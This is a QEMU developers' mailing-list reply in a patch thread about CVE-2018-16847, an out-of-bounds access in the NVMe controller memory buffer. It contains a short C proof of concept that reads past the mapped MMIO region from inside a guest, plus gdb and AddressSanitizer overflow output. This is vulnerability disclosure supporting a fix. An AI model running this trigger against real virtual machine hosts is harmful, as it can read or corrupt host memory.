Received: from eggs.gnu.org ([2001:4830:134:3::10]:45347)
	by lists.gnu.org with esmtp (Exim 4.71)
	(envelope-from <liq3ea@gmail.com>) id 1gMk9Y-0001lU-Lz
	for qemu-devel@nongnu.org; Tue, 13 Nov 2018 20:39:38 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
	(envelope-from <liq3ea@gmail.com>) id 1gMk9X-00062Y-75
	for qemu-devel@nongnu.org; Tue, 13 Nov 2018 20:39:36 -0500
MIME-Version: 1.0
References: <1541121763-3277-1-git-send-email-liq3ea@gmail.com>
	<CAKXe6SL=6m5u1utFoJCG65ucuBeGTiuu8rA9wEj_X-tO1jHzEA@mail.gmail.com>
	<20181113101704.GB4830@localhost.localdomain>
	<2db2eb88-bc7c-d3c0-93ca-43d6a2f79b0a@redhat.com>
In-Reply-To: <2db2eb88-bc7c-d3c0-93ca-43d6a2f79b0a@redhat.com>
From: Li Qiang <liq3ea@gmail.com>
Date: Wed, 14 Nov 2018 09:38:52 +0800
Message-ID: <CAKXe6S+e8zBgYU8DnU2tUqQm2C1w14pgqg55YmxwPn1UUW3E7g@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: Re: [Qemu-devel] [PATCH] nvme: fix oob access issue(CVE-2018-16847)
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <http://lists.nongnu.org/archive/html/qemu-devel/>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
To: Paolo Bonzini <pbonzini@redhat.com>
Cc: kwolf@redhat.com, keith.busch@intel.com, mreitz@redhat.com, P J P <ppandit@redhat.com>, qemu-block@nongnu.org, Qemu Developers <qemu-devel@nongnu.org>

Paolo Bonzini <pbonzini@redhat.com> =E4=BA=8E2018=E5=B9=B411=E6=9C=8814=E6=
=97=A5=E5=91=A8=E4=B8=89 =E4=B8=8A=E5=8D=882:27=E5=86=99=E9=81=93=EF=BC=9A

> On 13/11/2018 11:17, Kevin Wolf wrote:
> > Am 13.11.2018 um 02:45 hat Li Qiang geschrieben:
> >> Ping.... what't the status of this patch.
> >>
> >> I see Kevin's new pr doesn't contain this patch.
> >
> > Oh, I thought you said that you wanted to fix this at a higher level so
> > that the problem is caught before even getting into nvme code? If you
> > don't, I can apply the patch for my next pull request.
>
> As far as I know the bug doesn't exist.  Li Qiang, if you have a
> reproducer please send it.
>
>
Hello Paolo,
Though I've send the debug information and ASAN output in the mail to
secalert@redhat.com, I'm glad provide here.
This is for read, I think the write the same but as the PoC is in
userspace, the mmap can only map the exact size of the MMIO,
So we can only write within the area. But if we using a module we can write
the out of MMIO I think
The nvme device's parameter should set as 'cmb_size_mb=3D2' and the PCI
address may differ in your system.

Thanks,
Li Qiang

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>

int main(int argc, char **argv)
{
    char *filename =3D "/sys/bus/pci/devices/0000:00:04.0/resource2";
    uint32_t size =3D 2*1024*1024;
    char *mmio =3D NULL;
    int fd =3D open(filename, O_RDWR);
    if (fd < 0) {
        printf("open file error\n");
    exit(1);
    }
    mmio =3D mmap(NULL, size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
    if (mmio =3D=3D MAP_FAILED) {
        printf("mmap error\n");
    exit(1);
    }
    int x =3D *(uint64_t*)(mmio+size-1);
}

read:

[Switching to Thread 0x7fffc7326700 (LWP 52799)]

Thread 4 "qemu-system-x86" hit Breakpoint 1, nvme_cmb_read
(opaque=3D0x6240000b8100, addr=3D2097151, size=3D2) at hw/block/nvme.c:1182
1182 {
(gdb) p /x addr
$1 =3D 0x1fffff
(gdb) p /x addr+size
$2 =3D 0x200001
(gdb) c
Continuing.
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[Thread 0x7fff77efd700 (LWP 54057) exited]
=3D=3D52793=3D=3DERROR: AddressSanitizer: heap-buffer-overflow on address
0x7fff817ff800 at pc 0x7ffff6e9af7f bp 0x7fffc7322fc0 sp 0x7fffc7322770
READ of size 2 at 0x7fff817ff800 thread T3
[Thread 0x7fff7a183700 (LWP 53957) exited]
[Thread 0x7fff786fe700 (LWP 53953) exited]
[Thread 0x7fff70b21700 (LWP 53952) exited]
    #0 0x7ffff6e9af7e  (/usr/lib/x86_64-linux-gnu/libasan.so.3+0x5cf7e)
    #1 0x5555562193b3 in nvme_cmb_read hw/block/nvme.c:1186
    #2 0x555555d630d0 in memory_region_read_accessor
/home/liqiang02/qemu-upstream/qemu/memory.c:440
    #3 0x555555d638da in access_with_adjusted_size
/home/liqiang02/qemu-upstream/qemu/memory.c:570
    #4 0x555555d690fd in memory_region_dispatch_read1
/home/liqiang02/qemu-upstream/qemu/memory.c:1375
    #5 0x555555d692b5 in memory_region_dispatch_read
/home/liqiang02/qemu-upstream/qemu/memory.c:1404
    #6 0x555555ca765b in flatview_read_continue
/home/liqiang02/qemu-upstream/qemu/exec.c:3294
    #7 0x555555ca790d in flatview_read
/home/liqiang02/qemu-upstream/qemu/exec.c:3332
    #8 0x555555ca79d3 in address_space_read_full
/home/liqiang02/qemu-upstream/qemu/exec.c:3345
    #9 0x555555ca7aaa in address_space_rw
/home/liqiang02/qemu-upstream/qemu/exec.c:3375
    #10 0x555555daadd9 in kvm_cpu_exec
/home/liqiang02/qemu-upstream/qemu/accel/kvm/kvm-all.c:2031
    #11 0x555555d2b2e5 in qemu_kvm_cpu_thread_fn
/home/liqiang02/qemu-upstream/qemu/cpus.c:1277
    #12 0x555556a037a0 in qemu_thread_start util/qemu-thread-posix.c:498
    #13 0x7fffdadbd493 in start_thread
(/lib/x86_64-linux-gnu/libpthread.so.0+0x7493)
    #14 0x7fffdaafface in __clone (/lib/x86_64-linux-gnu/libc.so.6+0xe8ace)




> Prasad, please revoke the CVE.
>
> Paolo
>
>
